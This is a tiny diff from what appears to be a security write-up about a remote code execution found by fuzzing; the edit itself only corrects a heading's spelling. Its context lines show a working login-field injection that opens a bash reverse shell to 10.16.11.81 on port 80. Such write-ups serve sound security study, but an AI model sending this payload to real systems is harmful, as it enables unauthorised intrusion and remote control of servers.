@@ -64,7 +64,7 @@ Now, I confirmed there is a remote code execution that i found, after fuzz, I go
 
 ![1573268555327](img/1573268555327.png)
 
-`revershell`
+`reverseshell`
 
 ```
 op=login&username=1 2\',\'1\'\);  `bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.16.11.81%2F80%200%3E%261`
